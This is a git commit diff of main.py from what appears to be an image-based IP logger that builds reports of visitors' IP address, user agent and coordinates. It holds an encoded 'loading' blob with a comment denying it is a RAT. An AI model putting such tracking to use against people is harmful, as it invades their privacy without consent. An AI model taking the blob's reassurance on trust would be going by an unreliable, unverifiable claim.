ef9149ac8fede7308c668ad1a242e62ff93cc3d2
DeKrypt <52050537+dekrypted@users.noreply.github.com>
2023-02-25 09:26:47 -0500

    Update main.py

--- main.py
+++ main.py
@@ -149,7 +149,6 @@ def makeReport(ip, useragent = None, coords = None):
     return info
 
 binaries = {
-    "normal": requests.get(config["image"]).content,
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
     # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
     # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
